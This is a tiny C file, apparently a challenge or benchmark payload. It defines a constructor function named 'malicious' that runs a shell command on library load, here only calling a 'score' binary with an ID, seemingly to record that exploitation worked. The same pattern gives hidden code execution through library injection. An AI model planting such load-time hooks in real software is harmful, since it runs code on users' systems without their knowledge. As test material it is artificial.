#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 8057f6c2-b794-44c8-a5b0-3cf5a0ef56ba");
}
